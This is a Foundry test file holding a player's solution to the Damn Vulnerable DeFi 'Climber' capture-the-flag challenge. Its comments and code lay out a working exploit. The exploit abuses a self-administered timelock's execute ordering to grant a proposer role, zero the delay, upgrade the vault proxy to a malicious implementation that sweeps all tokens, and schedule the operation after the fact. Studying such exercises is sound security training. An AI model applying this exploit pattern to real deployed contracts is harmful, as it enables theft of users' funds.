// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ClimberAttacker, NewClimberVaultImplementation} from "./Climberattacker.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        /*
            This is by farthe most complex challenge of all
            To solve this challenge we have to take advantage of:
            1. the fact that ClimberTimelock is self administered
            2. the CEI pattern in the `ClimberTimelock::execute()` is not followed

            The attack oath is as follows:
            call ClimberTimelock::execute()
               |---> we have to make four external calls though the Timelock contract being msg.sender:
                    |---> 1. Climbertimelock::grantRole(PROPOSER_ROLE) to ClimberAttacker
                    |---> 2. Climbertimelock::updateDelay() to directly get the operations' state to OperationState.ReadyForExecution
                    |---> 3. ClimberVault::upgradeToAndCall() to change the current vault implementation to point to a malicios one
                            |---> although the _authorizeUpgrade() has onlyOwner modifier   
                                  since we make the call through ClimberTimelock which is the owner of the proxy:
                                  Timelock => ERC1967Proxy => Implementation UUPS
                                  we will be able to change the implementation to ours
                            |---> we change the implementation and then immediatly call a function on it
                                  NewClimberVaultImplementation::sweepFunds()
                                  |---> now we transfer the tokens from the old vault to recovery
                    /---> 4. ClimberAttacker::finishAttack()
                            |---> notice that that in execute after the calls the contract checks the operation state
                            |---> to be able to change the operation state we need to call the Timelock::schedule()
                            through the ClaimberAttacker (it has the PROPOSER_ROLE from step 1)
                            |---> now the operation stated is changed: OperationState.Unknown => OperationState.ReadyForExecution
                            |---> the last if check in the ClimberTimelock::execute() will pass successfully
            
            We have successfully recovered the tokens
        */

        NewClimberVaultImplementation impl = new NewClimberVaultImplementation();

        ClimberAttacker attacker = new ClimberAttacker(
            address(token),
            address(vault),
            payable(address(timelock))
        );

        bytes memory grantRoleCallData = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(attacker)
        );

        bytes memory updateDelayCallData = abi.encodeWithSelector(
            timelock.updateDelay.selector,
            0
        );

        bytes memory upgradeToCallData = abi.encodeWithSelector(
            vault.upgradeToAndCall.selector,
            address(impl),
            abi.encodeWithSelector(
                impl.sweepFunds.selector,
                address(token),
                address(vault),
                recovery
            )
        );

        bytes memory finishAttackCallData = abi.encodeWithSelector(
            attacker.finishAttack.selector
        );

        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(attacker);

        uint256[] memory values = new uint256[](targets.length);

        bytes[] memory dataElements = new bytes[](targets.length);
        dataElements[0] = grantRoleCallData;
        dataElements[1] = updateDelayCallData;
        dataElements[2] = upgradeToCallData;
        dataElements[3] = finishAttackCallData;

        attacker.prepareCallData(targets, dataElements);

        timelock.execute(targets, values, dataElements, 0);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
